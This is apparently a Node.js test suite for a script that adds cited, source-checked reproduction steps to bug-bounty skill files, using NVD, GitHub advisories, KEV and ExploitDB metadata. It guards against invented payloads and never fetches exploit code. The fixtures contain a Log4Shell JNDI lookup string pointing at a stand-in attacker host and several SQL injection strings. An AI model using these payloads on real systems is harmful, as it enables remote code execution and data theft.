import test from "node:test";
import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, readdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import {
  NVD_MIN_INTERVAL_MS,
  TIER_A_SKILLS,
  CHECKLIST_SKILLS,
  KEEP_SKILLS,
  TIER_B_SKILLS,
  TIER_C_SKILLS,
  NO_CVE_MAPPED,
  NO_CVE_TARGET,
  BODY_START,
  nvdWaitMs,
  expandCitedIds,
  rollupRepro,
  classifyRecord,
  renderSteps,
  assertCited,
  assertNoInventedPayload,
  corpusOf,
  summarizeNvd,
  summarizeVendor,
  indexExploitdb,
  indexKev,
  parseCsv,
  applyEnrichment,
  renderSkillSteps,
  reclassifyChecklist,
  createRunContext,
  enrichCve,
  cacheDocument,
  confidentCveForSkill,
  nvdConfirmsCandidate,
  markUnverified,
  applyTierB,
  applyTierC,
  backfillBc,
} from "../scripts/enrich-repro.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const FIX = join(ROOT, "tests/fixtures/repro");

async function load(name) {
  return readFile(join(FIX, name), "utf8");
}

function response(status, body, headers = {}) {
  return new Response(body, { status, headers });
}

test("NVD wait is at least 6s and leaves a rolling window of five calls", () => {
  assert.ok(NVD_MIN_INTERVAL_MS >= 6000);
  assert.equal(nvdWaitMs(0, 10_000), 0);
  assert.equal(nvdWaitMs(1_000, 1_000, NVD_MIN_INTERVAL_MS), NVD_MIN_INTERVAL_MS);
  assert.equal(nvdWaitMs(1_000, 1_000 + NVD_MIN_INTERVAL_MS, NVD_MIN_INTERVAL_MS), 0);
});

test("shorthand CVE citations and GHSA ids expand without dropping the base id", () => {
  const text = [
    "CVE-2024-22252/53",
    "CVE-2022-31656/31659",
    "CVE-2023-33160/33157/36941",
    "CVE-2024-21318/30043/38023/38024/38094",
    "CVE-2025-53770/53771",
    "GHSA-GQ52-6PHF-X2R6",
  ].join("\n");
  const { cves, ghsas } = expandCitedIds(text);
  assert.deepEqual(cves, [
    "CVE-2024-22252",
    "CVE-2024-22253",
    "CVE-2022-31656",
    "CVE-2022-31659",
    "CVE-2023-33160",
    "CVE-2023-33157",
    "CVE-2023-36941",
    "CVE-2024-21318",
    "CVE-2024-30043",
    "CVE-2024-38023",
    "CVE-2024-38024",
    "CVE-2024-38094",
    "CVE-2025-53770",
    "CVE-2025-53771",
  ]);
  assert.deepEqual(ghsas, ["ghsa-gq52-6phf-x2r6"]);
});

test("ExploitDB CSV indexes codes and does not keep a title or exploit body", async () => {
  const csv = await load("exploitdb-mini.csv");
  const rows = parseCsv(csv);
  assert.equal(rows[1][2], "Apache Log4j, test title");
  const index = indexExploitdb(csv);
  const hit = index.get("CVE-2021-44228");
  assert.equal(hit.length, 1);
  assert.equal(hit[0].id, "50592");
  assert.equal(hit[0].verified, 1);
  assert.equal(hit[0].file, "exploits/java/remote/50592.py");
  assert.equal(Object.hasOwn(hit[0], "description"), false);
  assert.equal(JSON.stringify(hit).includes("import "), false);
  assert.equal(index.get("CVE-2099-00001")[0].id, "50592");
  assert.equal(indexKev(JSON.parse(await load("kev-mini.json"))).get("CVE-2021-44228").knownRansomwareCampaignUse, "Known");
});

test("cite-or-omit rejects an uncited step line", () => {
  const markdown = [
    "## Steps to reproduce",
    "",
    "### Prerequisites",
    "- Not publicly documented beyond the NVD description.",
    "",
    "### Input / trigger",
    "- Not publicly available. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-99901)]",
    "",
    "### Expected (patched) vs vulnerable behavior",
    "- Abstract only. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-99901)]",
    "",
    "### How to confirm",
    "- Not possible from public sources. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-99901)]",
    "",
  ].join("\n");
  assert.throws(() => assertCited(markdown), /uncited line/);
});

test("no invented payload: banned constructs and uncited trigger strings are rejected", () => {
  assert.throws(
    () => assertNoInventedPayload("- Send UNION SELECT 1 [[nvd](https://nvd.nist.gov/vuln/detail/CVE-1)]", "improper input validation"),
    /banned construct/,
  );
  assert.throws(
    () => assertNoInventedPayload("- Use `${jndi:ldap://attacker.example/a}` [[nvd](https://nvd.nist.gov/vuln/detail/CVE-1)]", "no token here"),
    /uncited payload/,
  );
});

test("verified-public, partial, and unverified fixtures render cited steps and do not invent a payload", async () => {
  const nvd = summarizeNvd(JSON.parse(await load("nvd-verified.json")), "CVE-2021-44228");
  const vendor = summarizeVendor("https://logging.apache.org/log4j/2.x/security.html", 200, await load("vendor-verified.html"));
  const verified = {
    id: "CVE-2021-44228",
    nvd,
    vendor,
    ghsa: {
      status: 200,
      ghsa_id: "GHSA-jfh8-c2jp-5v3q",
      html_url: "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q",
      summary: "Remote code execution in Log4j",
      description: "JNDI lookup in log4j-core can execute arbitrary code.",
      packages: [{ ecosystem: "Maven", name: "org.apache.logging.log4j:log4j-core", range: ">= 2.0, < 2.15.0", patched: "2.15.0" }],
      pocRefs: ["https://github.com/tangxiaofeng7/apache-log4j-poc"],
      gave: "package range",
    },
    kev: { in_kev: true, gave: "dateAdded 2021-12-10", url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json", shortDescription: "SHOULD NOT BE A STEP" },
    exploitdb: [{ id: "50592", file: "exploits/java/remote/50592.py", verified: 1, url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/java/remote/50592.py" }],
    poc_in_github: { status: 200, index_url: "https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2021/CVE-2021-44228.json", top: [{ html_url: "https://github.com/tangxiaofeng7/apache-log4j-poc", stargazers_count: 50 }] },
    h1: null,
  };
  verified.repro = classifyRecord(verified);
  assert.equal(verified.repro, "verified-public");
  const verifiedSteps = renderSteps(verified);
  assertCited(`## Steps to reproduce\n\n${verifiedSteps}`);
  assertNoInventedPayload(verifiedSteps, corpusOf(verified));
  assert.match(verifiedSteps, /\$\{jndi:ldap:\/\/attacker\.example\/a\}/);
  assert.match(verifiedSteps, /\[\[vendor\]\(https:\/\/logging\.apache\.org\/log4j\/2\.x\/security\.html\)\]/);
  assert.equal(verifiedSteps.includes("do not protect against attacker controlled LDAP"), false);
  assert.equal(verifiedSteps.includes("SHOULD NOT BE A STEP"), false);
  assert.equal(verifiedSteps.includes("curl"), false);
  assert.match(verifiedSteps, /### What's missing\n- \(none for verified-public\)/);

  const partialNvd = summarizeNvd(JSON.parse(await load("nvd-partial.json")), "CVE-2024-99901");
  const partial = {
    id: "CVE-2024-99901",
    nvd: partialNvd,
    vendor: null,
    ghsa: { html_url: null, packages: [], pocRefs: [], description: "", gave: "no GHSA for this CVE" },
    kev: { in_kev: false, gave: "not in KEV" },
    exploitdb: [],
    poc_in_github: { status: 404, top: [], gave: "404" },
    h1: null,
  };
  partial.repro = classifyRecord(partial);
  assert.equal(partial.repro, "partial");
  const partialSteps = renderSteps(partial);
  assertCited(`## Steps to reproduce\n\n${partialSteps}`);
  assertNoInventedPayload(partialSteps, corpusOf(partial));
  assert.match(partialSteps, /improper input validation/);
  assert.match(partialSteps, /### What's missing/);
  assert.equal(partialSteps.includes("${"), false);
  assert.equal(/GET\s+\//.test(partialSteps), false);

  const empty = summarizeNvd(JSON.parse(await load("nvd-empty.json")), "CVE-2099-99999");
  const unverified = {
    id: "CVE-2099-99999",
    nvd: empty,
    vendor: null,
    ghsa: { html_url: null, packages: [], pocRefs: [], description: "", gave: "no GHSA for this CVE" },
    kev: { in_kev: false, gave: "not in KEV" },
    exploitdb: [],
    poc_in_github: { status: 404, top: [] },
    h1: null,
  };
  unverified.repro = classifyRecord(unverified);
  assert.equal(unverified.repro, "unverified");
  const unverifiedSteps = renderSteps(unverified);
  assert.match(unverifiedSteps, /`repro: unverified`/);
  assertCited(`## Steps to reproduce\n\n${unverifiedSteps}`);
  assertNoInventedPayload(unverifiedSteps, corpusOf(unverified));
  assert.match(unverifiedSteps, /### What's missing/);
  assert.match(unverifiedSteps, /CVE not in NVD/);
});

test("an NVD link inside GHSA references is not a PoC and does not invent a request", () => {
  const description = "Incorrect username validation in the registration process of CTFd v2.0.0 - v2.2.2 allows an attacker to take over an arbitrary account if the username is known. To exploit the vulnerability, one must register with a username identical to the victim's username, but with white space inserted before and/or after the username.";
  const record = {
    id: "CVE-2020-7245",
    nvd: {
      status: 200,
      vulnStatus: "Modified",
      description,
      detailUrl: "https://nvd.nist.gov/vuln/detail/CVE-2020-7245",
      queryUrl: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-7245",
      products: [{ vendor: "ctfd", product: "ctfd", range: ">= 2.0.0, <= 2.2.2" }],
      productCount: 1,
      exploitRefs: [],
      cwes: ["CWE-640"],
      gave: "description, configurations; no Exploit-tagged refs",
    },
    vendor: null,
    ghsa: {
      status: 200,
      ghsa_id: "GHSA-qrhm-93gw-vg83",
      html_url: "https://github.com/advisories/GHSA-qrhm-93gw-vg83",
      description,
      packages: [],
      pocRefs: [],
      gave: "advisory text; no package range",
    },
    kev: { in_kev: false, gave: "not in KEV" },
    exploitdb: [],
    poc_in_github: { status: 404, top: [], gave: "404" },
    h1: null,
  };
  record.repro = classifyRecord(record);
  assert.equal(record.repro, "partial");
  const steps = renderSteps(record);
  assertCited(`## Steps to reproduce\n\n${steps}`);
  assertNoInventedPayload(steps, corpusOf(record));
  assert.equal(steps.includes("https://nvd.nist.gov/vuln/detail/CVE-2020-7245)] [[ghsa]"), false);
  assert.equal(/victim@|white space inserted before/.test(steps), false);
  assert.match(steps, /take over an arbitrary account/);
  assert.match(steps, /### What's missing/);
});

test("GHSA-only steps cite the advisory and do not label it as NVD", () => {
  const record = {
    id: "ghsa-cxww-7g56-2vh6",
    repro: "partial",
    nvd: { detailUrl: null, description: "", products: [], exploitRefs: [], cwes: [] },
    vendor: null,
    ghsa: {
      html_url: "https://github.com/advisories/GHSA-cxww-7g56-2vh6",
      description: "actions/download-artifact before 4.1.3 is affected by path traversal.",
      packages: [{ ecosystem: "actions", name: "actions/download-artifact", range: ">= 4.0.0, < 4.1.3", patched: "4.1.3" }],
      pocRefs: [],
      gave: "package range",
    },
    kev: { in_kev: null, gave: "no CVE id" },
    exploitdb: [],
    poc_in_github: { top: [] },
    h1: null,
    cited_as: ["ghsa-cxww-7g56-2vh6"],
  };
  const steps = renderSteps(record);
  assertCited(`## Steps to reproduce\n\n${steps}`);
  assert.equal(/\[\[nvd\]\(https:\/\/github\.com/.test(steps), false);
  assert.match(steps, /\[\[ghsa\]\(https:\/\/github\.com\/advisories\/GHSA-cxww-7g56-2vh6\)\]/);
  const other = {
    ...record,
    id: "CVE-2024-99901",
    cited_as: [],
    nvd: {
      detailUrl: "https://nvd.nist.gov/vuln/detail/CVE-2024-99901",
      description: "ExampleApp before version 1.2.3 is affected by improper input validation that may allow access to data.",
      products: [{ vendor: "example", product: "app", range: "< 1.2.3" }],
      cwes: [],
      exploitRefs: [],
    },
    ghsa: { html_url: null, description: "", packages: [], pocRefs: [] },
  };
  const joined = renderSkillSteps([record, other], new Set(["CVE-2024-99901"]));
  assert.match(joined, /## Steps to reproduce — ghsa-cxww-7g56-2vh6\n/);
  assert.equal(joined.includes("(ghsa-cxww-7g56-2vh6)"), false);
});

test("withdrawn or rejected advisories stay unverified even when a PoC URL exists", () => {
  const base = {
    nvd: {
      vulnStatus: "Analyzed",
      description: "Example product before version 1.2 is affected by path traversal in a named parameter.",
      products: [{ vendor: "example", product: "app", range: "< 1.2" }],
      detailUrl: "https://nvd.nist.gov/vuln/detail/CVE-2024-1000",
      exploitRefs: ["https://github.com/example/exploit-cve-2024-1000"],
    },
    ghsa: {
      withdrawn_at: "2024-02-02T00:00:00Z",
      html_url: "https://github.com/advisories/GHSA-aaaa-bbbb-cccc",
      description: "Example product before version 1.2 is affected by path traversal.",
      packages: [{ name: "example", range: "< 1.2", patched: "1.2" }],
      pocRefs: ["https://github.com/example/poc"],
    },
    vendor: null,
    exploitdb: [],
    poc_in_github: { top: [] },
    h1: null,
  };
  assert.equal(classifyRecord(base), "unverified");
  assert.equal(classifyRecord({ ...base, ghsa: { ...base.ghsa, withdrawn_at: null }, nvd: { ...base.nvd, vulnStatus: "Rejected" } }), "unverified");
});

test("mixed per-CVE statuses roll up to partial", () => {
  assert.equal(rollupRepro(["verified-public", "verified-public"]), "verified-public");
  assert.equal(rollupRepro(["unverified", "verified-public"]), "partial");
  assert.equal(rollupRepro(["partial"]), "partial");
});

test("offline enrichCve classifies three fixtures, skips exploit bodies, and reuses a fresh cache", async () => {
  const nvdVerified = await load("nvd-verified.json");
  const nvdPartial = await load("nvd-partial.json");
  const nvdEmpty = await load("nvd-empty.json");
  const ghsa = await load("ghsa-verified.json");
  const poc = await load("poc-verified.json");
  const vendor = await load("vendor-verified.html");
  const kev = indexKev(JSON.parse(await load("kev-mini.json")));
  const exploitdb = indexExploitdb(await load("exploitdb-mini.csv"));
  const calls = [];
  const sleeps = [];
  const fetchImpl = async (url) => {
    calls.push(url);
    if (url.includes("/-/raw/main/exploits/")) throw new Error(`exploit body fetched: ${url}`);
    if (url.includes("services.nvd.nist.gov") && url.includes("CVE-2021-44228")) return response(200, nvdVerified);
    if (url.includes("services.nvd.nist.gov") && url.includes("CVE-2024-99901")) return response(200, nvdPartial);
    if (url.includes("services.nvd.nist.gov") && url.includes("CVE-2099-99999")) return response(200, nvdEmpty);
    if (url.includes("api.github.com/advisories") && url.includes("CVE-2021-44228")) return response(200, ghsa);
    if (url.includes("api.github.com/advisories")) return response(200, "[]");
    if (url.includes("logging.apache.org")) return response(200, vendor);
    if (url.includes("example.invalid")) return response(404, "missing");
    if (url.includes("PoC-in-GitHub") && url.includes("CVE-2021-44228")) return response(200, poc);
    if (url.includes("PoC-in-GitHub")) return response(404, "missing");
    throw new Error(`unexpected url ${url}`);
  };
  const cacheDir = await mkdtemp(join(tmpdir(), "bh-repro-"));
  try {
    const ctx = createRunContext({
      fetch: fetchImpl,
      sleep: async (ms) => { sleeps.push(ms); },
      nvdIntervalMs: NVD_MIN_INTERVAL_MS,
      cacheDir,
      kev,
      exploitdb,
      h1ByCve: new Map(),
      now: () => new Date("2026-11-04T00:00:00.000Z"),
      token: "",
    });
    const verified = await enrichCve("CVE-2021-44228", ctx);
    const partial = await enrichCve("CVE-2024-99901", ctx);
    const unverified = await enrichCve("CVE-2099-99999", ctx);
    assert.equal(verified.repro, "verified-public");
    assert.equal(partial.repro, "partial");
    assert.equal(unverified.repro, "unverified");
    assert.ok(sleeps.some((ms) => ms >= 6000));
    assert.equal(calls.some((url) => url.includes("/-/raw/main/exploits/")), false);
    assert.equal(calls.some((url) => url.includes("example.invalid/broken")), false);
    const cached = cacheDocument(verified);
    assert.equal(JSON.stringify(cached).includes("test title"), false);
    assert.equal(JSON.stringify(cached.sources.exploitdb[0].file).includes("50592.py"), true);
    ctx.fetch = async () => { throw new Error("network should not be used"); };
    const again = await enrichCve("CVE-2021-44228", ctx);
    assert.equal(again.repro, "verified-public");
    assert.match(again.section_markdown, /\$\{jndi:ldap:\/\/attacker\.example\/a\}/);
  } finally {
    await rm(cacheDir, { recursive: true, force: true });
  }
});

test("applying enrichment is idempotent and checklists are reclassified without new steps", () => {
  const record = {
    id: "CVE-2024-99901",
    repro: "partial",
    nvd: summarizeNvd({
      totalResults: 1,
      vulnerabilities: [{
        cve: {
          id: "CVE-2024-99901",
          vulnStatus: "Analyzed",
          descriptions: [{ lang: "en", value: "ExampleApp before version 1.2.3 is affected by improper input validation that may allow access to data." }],
          references: [],
        },
      }],
    }, "CVE-2024-99901"),
    vendor: null,
    ghsa: { html_url: null, packages: [], pocRefs: [], description: "", gave: "no GHSA for this CVE" },
    kev: { in_kev: false, url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json", gave: "not in KEV" },
    exploitdb: [],
    exploitdbError: "no row with this CVE in codes",
    poc_in_github: { status: 404, top: [], gave: "404 for master/2024/CVE-2024-99901.json" },
    h1: null,
  };
  const original = "# SKILL: demo\nUNIQUE-BODY-LINE\n";
  const once = applyEnrichment(original, [record], new Set(["CVE-2024-99901"]), []);
  const twice = applyEnrichment(once, [record], new Set(["CVE-2024-99901"]), []);
  assert.equal(twice, once);
  assert.match(once, /^---\n# bughive-repro-start\ncve: CVE-2024-99901\nrepro: partial/m);
  assert.match(once, /## Steps to reproduce/);
  assert.match(once, /UNIQUE-BODY-LINE/);
  assert.equal((once.match(/## Steps to reproduce/g) || []).length, 1);

  const staged = "<!-- harvested: example/repo/SKILL.md on 2026-10-23T00:00:00+00:00 -->\n<!-- STAGING ONLY -->\n\n---\nname: report-writing\ndescription: Write the report.\n---\n\n# REPORT\nTEMPLATE-BODY\n";
  const checklist = reclassifyChecklist(staged);
  const checklistAgain = reclassifyChecklist(checklist);
  assert.equal(checklistAgain, checklist);
  assert.match(checklist, /kind: checklist\nrepro: checklist\n---/);
  assert.match(checklist, /TEMPLATE-BODY/);
  assert.equal(checklist.includes("## Steps to reproduce"), false);
});

test("tier, checklist, and keep lists do not overlap", () => {
  const tier = new Set(TIER_A_SKILLS);
  const checks = new Set(CHECKLIST_SKILLS);
  const keep = new Set(KEEP_SKILLS);
  assert.equal(tier.size, 22);
  assert.equal(checks.size, 6);
  assert.equal(keep.size, 3);
  for (const path of checks) assert.equal(tier.has(path), false);
  for (const path of keep) {
    assert.equal(tier.has(path), false);
    assert.equal(checks.has(path), false);
  }
});

test("smoke: each tier-a skill has repro and a cited Steps section; checklists are checklists; keep files are untouched", async () => {
  for (const rel of TIER_A_SKILLS) {
    const text = await readFile(join(ROOT, rel), "utf8");
    assert.match(text, /^repro:\s*(verified-public|partial|unverified)\s*$/m, rel);
    assert.match(text, /^## Steps to reproduce\b/m, rel);
    const start = text.indexOf(BODY_START);
    const end = text.indexOf("<!-- bughive-repro-end -->");
    assert.ok(start >= 0 && end > start, rel);
    const steps = text.slice(start, end);
    assertCited(steps);
    const ids = expandCitedIds(text);
    let corpus = "";
    let loaded = 0;
    for (const id of [...ids.cves, ...ids.ghsas]) {
      try {
        const doc = JSON.parse(await readFile(join(ROOT, "skills/_index/repro", `${id}.json`), "utf8"));
        loaded += 1;
        for (const excerpt of doc.audit?.excerpts || []) corpus += `\n${excerpt.text || ""}`;
        corpus += `\n${doc.record?.vendor?.excerpt || ""}`;
        corpus += `\n${doc.record?.nvd?.description || ""}`;
        corpus += `\n${doc.record?.ghsa?.description || ""}`;
      } catch {
        // A GHSA cited in the skill is cached under its CVE id when one exists.
      }
    }
    assert.ok(loaded > 0, rel);
    assertNoInventedPayload(steps, corpus);
  }
  for (const rel of CHECKLIST_SKILLS) {
    const text = await readFile(join(ROOT, rel), "utf8");
    assert.match(text, /^kind:\s*checklist\s*$/m, rel);
    assert.match(text, /^repro:\s*checklist\s*$/m, rel);
    assert.equal(text.includes(BODY_START), false, rel);
  }
  for (const rel of KEEP_SKILLS) {
    const text = await readFile(join(ROOT, rel), "utf8");
    assert.equal(text.includes(BODY_START), false, rel);
    assert.equal(text.includes("kind: checklist"), false, rel);
    assert.equal(/^repro:/m.test(text), false, rel);
  }
});

test("tier B and C lists do not overlap protected skills", () => {
  const protectedSkills = new Set([...TIER_A_SKILLS, ...CHECKLIST_SKILLS, ...KEEP_SKILLS]);
  assert.equal(TIER_B_SKILLS.length, 81);
  assert.equal(new Set(TIER_B_SKILLS).size, 81);
  assert.equal(TIER_C_SKILLS.length, 90);
  assert.equal(new Set(TIER_C_SKILLS).size, 90);
  for (const rel of [...TIER_B_SKILLS, ...TIER_C_SKILLS]) assert.equal(protectedSkills.has(rel), false, rel);
  for (const rel of TIER_B_SKILLS) assert.equal(TIER_C_SKILLS.includes(rel), false, rel);
});

test("only the Log4j 2.14.1 JNDI skill resolves a CVE", () => {
  const log4 = "# SKILL: log4shell\nJava + Log4j ≤ 2.14.1.\n${jndi:ldap://collab/a}\n";
  assert.equal(confidentCveForSkill("skills/seeds/log4shell.md", log4), "CVE-2021-44228");
  assert.equal(confidentCveForSkill("skills/seeds/log4shell.md", "# SKILL: log4shell\nLog4j somewhere\n"), null);
  assert.equal(confidentCveForSkill("skills/seeds/sqli.md", "# SKILL: sqli\nLog4j ≤ 2.14.1 ${jndi:ldap://x}\n"), null);
  assert.equal(confidentCveForSkill("skills/staging/0x002132-skills-bugbounty-okta-attack.staged.md", "Okta .okta.com password spray"), null);
  assert.equal(nvdConfirmsCandidate({
    id: "CVE-2021-44228",
    nvd: { status: 200, description: "Apache Log4j2 through 2.15.0 JNDI features" },
  }, "CVE-2021-44228"), true);
  assert.equal(nvdConfirmsCandidate({
    id: "CVE-2021-44228",
    nvd: { status: 200, description: "A different product is affected by improper input validation." },
  }, "CVE-2021-44228"), false);
  assert.equal(nvdConfirmsCandidate({
    id: "CVE-2021-44228",
    nvd: { status: 403, rateLimited: true, description: "Apache Log4j2 JNDI" },
  }, "CVE-2021-44228"), false);
});

test("no confident match and tier C are unverified status blocks with no invented steps", () => {
  const original = "# SKILL: sqli\n' OR '1'='1\n1 UNION SELECT NULL--\n";
  const once = markUnverified(original, NO_CVE_MAPPED);
  const twice = markUnverified(once, NO_CVE_MAPPED);
  assert.equal(twice, once);
  assert.match(once, /^cve: null$/m);
  assert.match(once, /^repro: unverified$/m);
  assert.match(once, /^- no CVE mapped$/m);
  assert.equal(once.includes("### Prerequisites"), false);
  assert.equal(once.includes("### Input / trigger"), false);
  const block = once.slice(once.indexOf(BODY_START), once.indexOf("<!-- bughive-repro-end -->"));
  assertNoInventedPayload(block, "");
  assert.match(once, /UNION SELECT/);

  const tierC = applyTierC("# SKILL: bughunter\nHunt for real bugs.\n");
  const tierCAgain = applyTierC(tierC);
  assert.equal(tierCAgain, tierC);
  assert.match(tierC, /^repro: unverified$/m);
  assert.match(tierC, /^- no CVE\/target in skill; needs teardown or stays unverified$/m);
  assert.equal(tierC.includes(NO_CVE_MAPPED), false);
  const tierBlock = tierC.slice(tierC.indexOf(BODY_START), tierC.indexOf("<!-- bughive-repro-end -->"));
  assertNoInventedPayload(tierBlock, "");
  assert.equal(tierBlock.includes("curl"), false);
});

test("offline backfill enriches a confident CVE, marks the rest, and writes one cache file", async () => {
  const nvdVerified = await load("nvd-verified.json");
  const ghsa = await load("ghsa-verified.json");
  const poc = await load("poc-verified.json");
  const vendor = await load("vendor-verified.html");
  const kev = indexKev(JSON.parse(await load("kev-mini.json")));
  const exploitdb = indexExploitdb(await load("exploitdb-mini.csv"));
  const calls = [];
  const fetchImpl = async (url) => {
    calls.push(url);
    if (url.includes("/-/raw/main/exploits/")) throw new Error(`exploit body fetched: ${url}`);
    if (url.includes("services.nvd.nist.gov") && url.includes("CVE-2021-44228")) return response(200, nvdVerified);
    if (url.includes("api.github.com/advisories") && url.includes("CVE-2021-44228")) return response(200, ghsa);
    if (url.includes("logging.apache.org")) return response(200, vendor);
    if (url.includes("PoC-in-GitHub") && url.includes("CVE-2021-44228")) return response(200, poc);
    throw new Error(`unexpected url ${url}`);
  };
  const root = await mkdtemp(join(tmpdir(), "bh-bc-"));
  try {
    await mkdir(join(root, "skills/seeds"), { recursive: true });
    const log4 = "# SKILL: log4shell\nJava + Log4j ≤ 2.14.1.\n${jndi:ldap://collab/a}\n";
    const sqli = "# SKILL: sqli\n' OR '1'='1\n";
    const note = "# SKILL: bughunter\nNo target.\n";
    await writeFile(join(root, "skills/seeds/log4shell.md"), log4);
    await writeFile(join(root, "skills/seeds/sqli.md"), sqli);
    await writeFile(join(root, "skills/seeds/note.md"), note);
    const cacheDir = join(root, "cache");
    const ctx = createRunContext({
      fetch: fetchImpl,
      sleep: async () => {},
      nvdIntervalMs: 0,
      cacheDir,
      kev,
      exploitdb,
      h1ByCve: new Map(),
      now: () => new Date("2026-11-04T00:00:00.000Z"),
      token: "",
    });
    const summary = await backfillBc(ctx, {
      root,
      tierB: ["skills/seeds/log4shell.md", "skills/seeds/sqli.md"],
      tierC: ["skills/seeds/note.md"],
      write: true,
    });
    assert.equal(summary.confident_cve, 1);
    assert.equal(summary.unmapped, 1);
    assert.equal(summary.tier_c_unverified, 1);
    assert.deepEqual(summary.cache_added, ["CVE-2021-44228"]);
    assert.equal(calls.some((url) => url.includes("CVE-2024")), false);
    assert.equal(calls.some((url) => url.includes("/-/raw/main/exploits/")), false);
    const names = await readdir(cacheDir);
    assert.deepEqual(names, ["CVE-2021-44228.json"]);
    const enriched = await readFile(join(root, "skills/seeds/log4shell.md"), "utf8");
    assert.match(enriched, /^cve: CVE-2021-44228$/m);
    assert.match(enriched, /^repro: verified-public$/m);
    assert.match(enriched, /^references:$/m);
    assert.match(enriched, /## Steps to reproduce/);
    assert.equal(enriched.includes(NO_CVE_MAPPED), false);
    const steps = enriched.slice(enriched.indexOf(BODY_START), enriched.indexOf("<!-- bughive-repro-end -->"));
    assertCited(steps);
    const doc = JSON.parse(await readFile(join(cacheDir, "CVE-2021-44228.json"), "utf8"));
    let corpus = "";
    for (const excerpt of doc.audit?.excerpts || []) corpus += `\n${excerpt.text || ""}`;
    corpus += `\n${doc.record?.nvd?.description || ""}`;
    corpus += `\n${doc.record?.ghsa?.description || ""}`;
    corpus += `\n${doc.record?.vendor?.excerpt || ""}`;
    assertNoInventedPayload(steps, corpus);
    assert.equal(JSON.stringify(doc).includes("import "), false);
    const unmapped = await readFile(join(root, "skills/seeds/sqli.md"), "utf8");
    assert.match(unmapped, /^- no CVE mapped$/m);
    assert.match(unmapped, /^repro: unverified$/m);
    const tierC = await readFile(join(root, "skills/seeds/note.md"), "utf8");
    assert.match(tierC, /^- no CVE\/target in skill; needs teardown or stays unverified$/m);
    ctx.fetch = async () => { throw new Error("network should not be used"); };
    const again = await backfillBc(ctx, {
      root,
      tierB: ["skills/seeds/log4shell.md", "skills/seeds/sqli.md"],
      tierC: ["skills/seeds/note.md"],
      write: true,
    });
    assert.equal(again.cache_added_count, 0);
    assert.equal(await readFile(join(root, "skills/seeds/log4shell.md"), "utf8"), enriched);
    assert.equal(await readFile(join(root, "skills/seeds/sqli.md"), "utf8"), unmapped);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("a confident id whose NVD text is a different product is refused and not cached", async () => {
  const root = await mkdtemp(join(tmpdir(), "bh-bc-miss-"));
  try {
    const cacheDir = join(root, "cache");
    const ctx = createRunContext({
      fetch: async (url) => {
        if (url.includes("services.nvd.nist.gov")) {
          return response(200, JSON.stringify({
            totalResults: 1,
            vulnerabilities: [{ cve: { id: "CVE-2021-44228", vulnStatus: "Analyzed", descriptions: [{ lang: "en", value: "ExampleApp before 1.2.3 is affected by improper input validation." }], references: [] } }],
          }));
        }
        if (url.includes("api.github.com/advisories")) return response(200, "[]");
        if (url.includes("PoC-in-GitHub")) return response(404, "missing");
        throw new Error(`unexpected url ${url}`);
      },
      sleep: async () => {},
      nvdIntervalMs: 0,
      cacheDir,
      kev: new Map(),
      exploitdb: new Map(),
      h1ByCve: new Map(),
      token: "",
    });
    await assert.rejects(
      () => applyTierB("skills/seeds/log4shell.md", "# SKILL: log4shell\nJava + Log4j ≤ 2.14.1.\n${jndi:ldap://x}\n", ctx),
      /did not confirm/,
    );
    let names = [];
    try { names = await readdir(cacheDir); } catch { names = []; }
    assert.deepEqual(names, []);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("committed tier B and tier C skills match the backfill", async () => {
  let enriched = 0;
  let unmapped = 0;
  for (const rel of TIER_B_SKILLS) {
    const text = await readFile(join(ROOT, rel), "utf8");
    const start = text.indexOf(BODY_START);
    const end = text.indexOf("<!-- bughive-repro-end -->");
    assert.ok(start >= 0 && end > start, rel);
    const block = text.slice(start, end);
    if (rel.endsWith("/log4shell.md")) {
      enriched += 1;
      assert.equal(confidentCveForSkill(rel, text), "CVE-2021-44228");
      assert.match(text, /^cve: CVE-2021-44228$/m, rel);
      assert.match(text, /^repro:\s*(verified-public|partial|unverified)\s*$/m, rel);
      assert.match(text, /^references:$/m, rel);
      assert.equal(block.includes(NO_CVE_MAPPED), false, rel);
      assertCited(block);
      const doc = JSON.parse(await readFile(join(ROOT, "skills/_index/repro/CVE-2021-44228.json"), "utf8"));
      let corpus = "";
      for (const excerpt of doc.audit?.excerpts || []) corpus += `\n${excerpt.text || ""}`;
      corpus += `\n${doc.record?.vendor?.excerpt || ""}`;
      corpus += `\n${doc.record?.nvd?.description || ""}`;
      corpus += `\n${doc.record?.ghsa?.description || ""}`;
      assertNoInventedPayload(block, corpus);
      assert.equal(JSON.stringify(doc.sources?.exploitdb || []).includes("import "), false);
    } else {
      unmapped += 1;
      assert.equal(confidentCveForSkill(rel, text), null, rel);
      assert.match(text, /^cve: null$/m, rel);
      assert.match(text, /^repro: unverified$/m, rel);
      assert.match(block, /^- no CVE mapped$/m, rel);
      assert.equal(block.includes("### Prerequisites"), false, rel);
      assert.equal(block.includes("### Input / trigger"), false, rel);
      assertNoInventedPayload(block, "");
    }
  }
  assert.equal(enriched, 1);
  assert.equal(unmapped, 80);
  for (const rel of TIER_C_SKILLS) {
    const text = await readFile(join(ROOT, rel), "utf8");
    const start = text.indexOf(BODY_START);
    const end = text.indexOf("<!-- bughive-repro-end -->");
    assert.ok(start >= 0 && end > start, rel);
    const block = text.slice(start, end);
    assert.match(text, /^cve: null$/m, rel);
    assert.match(text, /^repro: unverified$/m, rel);
    assert.match(block, /^- no CVE\/target in skill; needs teardown or stays unverified$/m, rel);
    assert.equal(block.includes(NO_CVE_MAPPED), false, rel);
    assert.equal(block.includes("### Prerequisites"), false, rel);
    assertNoInventedPayload(block, "");
  }
});
